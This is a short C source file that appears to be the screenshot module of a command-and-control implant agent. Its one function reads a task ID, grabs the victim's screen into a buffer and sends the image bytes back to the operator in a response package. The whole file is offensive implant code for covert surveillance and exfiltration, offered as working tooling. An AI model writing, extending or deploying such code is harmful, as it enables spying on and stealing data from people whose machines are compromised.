#include "WrapScreenshot.h"
#include "BaseScreenshot.h"

BOOL wrapScreenshot(PParser arguments)
{
    SIZE_T uuidLength = 36;
    PCHAR taskUuid = getString(arguments, &uuidLength);

    // Create a response package
    PPackage responseTask = newPackage(POST_RESPONSE, TRUE);
    addString(responseTask, taskUuid, FALSE);

    // Initialize buffer for screenshot
    #define MAX_SCREENSHOT_SIZE 10485760 // Adjust as needed
    char* screenshotBuffer = (char*)LocalAlloc(LMEM_ZEROINIT, MAX_SCREENSHOT_SIZE);
    size_t screenshotSize = 0;

    // Execute the Screenshot command
    BOOL success = baseScreenshot(screenshotBuffer, MAX_SCREENSHOT_SIZE, &screenshotSize);

    if (!success)
    {
        // Add an error message without using std::string
        addString(responseTask, "[SCREENSHOT] Failed to take screenshot.\n", FALSE);
    }
    else
    {
        // Add the screenshot data to the response package
        addBytes(responseTask, (PBYTE)screenshotBuffer, screenshotSize, TRUE);
    }

    // Send the response package
    sendPackage(responseTask);

    // Clean up
    LocalFree(taskUuid);
    LocalFree(screenshotBuffer);

    return success;
}